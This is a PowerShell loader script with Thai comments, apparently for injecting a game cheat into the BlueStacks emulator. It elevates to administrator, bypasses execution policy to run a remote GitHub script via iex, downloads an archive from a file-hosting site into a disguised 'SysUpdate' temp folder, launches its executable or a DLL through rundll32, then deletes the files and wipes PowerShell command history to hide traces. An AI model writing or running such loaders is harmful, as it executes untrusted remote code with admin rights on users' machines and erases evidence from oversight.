# =========================================================
# 1. ขอสิทธิ์ Administrator และรันสคริปต์จาก GitHub
# =========================================================
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    # แก้ไข Syntax การตั้งค่า TLS และรัน GitHub Script ให้รองรับ PowerShell ทุกเวอร์ชัน
    $adminCmd = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (Invoke-RestMethod 'https://raw.githubusercontent.com/potae112/Cmdfreefire/main/dugduy.ps1')"
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$adminCmd`"" -Verb RunAs
    exit
}

# =========================================================
# 2. ตั้งค่าไฟล์และตำแหน่ง (เน้นเนียนและจัดการง่าย)
# =========================================================
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$url = "https://files.catbox.moe/0ukxya.dll" # **ต้องมั่นใจว่าไฟล์ต้นทางคือ .zip เท่านั้น**
$workDir = "$env:LOCALAPPDATA\Temp\SysUpdate"
$zipPath = Join-Path $workDir "package.zip"
$blueStacksPath = "C:\Program Files\BlueStacks_nxt\HD-Player.exe"

# สร้างโฟลเดอร์ทำงาน
if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue }
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

# =========================================================
# 3. ดาวน์โหลดและแตกไฟล์ (PowerShell Native)
# =========================================================
Write-Host "[*] Downloading System Components..." -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $url -OutFile $zipPath -UseBasicParsing -ErrorAction Stop
} catch {
    Write-Host "[!] Download failed: Check your internet or URL." -ForegroundColor Red
    Pause; exit
}

Write-Host "[*] Extracting Package..." -ForegroundColor Cyan
try {
    # ใช้ Expand-Archive แทน tar เพื่อรองรับ Windows ทุกรุ่น
    Expand-Archive -Path $zipPath -DestinationPath $workDir -Force
} catch {
    Write-Host "[!] Error: The file at URL might not be a valid .zip file." -ForegroundColor Yellow
}

# =========================================================
# 4. ค้นหาไฟล์ .exe และเตรียม DLL
# =========================================================
$exe = Get-ChildItem -Path $workDir -Filter "*.exe" -Recurse | Select-Object -First 1
$dllName = "Memory.dll" # เปลี่ยนชื่อให้ตรงกับไฟล์จริงใน .zip ของคุณ
$dllPath = Join-Path $workDir $dllName

if (!(Test-Path $dllPath)) {
    $foundDll = Get-ChildItem -Path $workDir -Filter "*.dll" -Recurse | Select-Object -First 1
    if ($foundDll) { Copy-Item $foundDll.FullName -Destination $workDir }
}

# =========================================================
# 5. สั่งรันระบบ
# =========================================================
if ($exe) {
    Write-Host "[+] Launching Service: $($exe.Name)" -ForegroundColor Green
    Start-Process -FilePath $exe.FullName -WorkingDirectory $exe.DirectoryName -Wait
} else {
    Write-Host "[!] No Executable found. Trying DLL Proxy..." -ForegroundColor Yellow
    # ถ้าไม่มี .exe ให้ลองรันผ่าน rundll32 ตามแผนสำรอง
    if (Test-Path $dllPath) {
        Start-Process -FilePath "rundll32.exe" -ArgumentList "`"$dllPath`",Control_RunDLL `"$blueStacksPath`"" -Wait
    }
}

# =========================================================
# 6. ทำลายร่องรอย (Cleanup)
# =========================================================
Write-Host "[*] Cleaning up traces..." -ForegroundColor Gray
Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue

# ล้างประวัติคำสั่งล่าสุด
$history = (Get-PSReadLineOption).HistorySavePath
if (Test-Path $history) { Clear-Content $history }

Write-Host "[+] Done." -ForegroundColor Green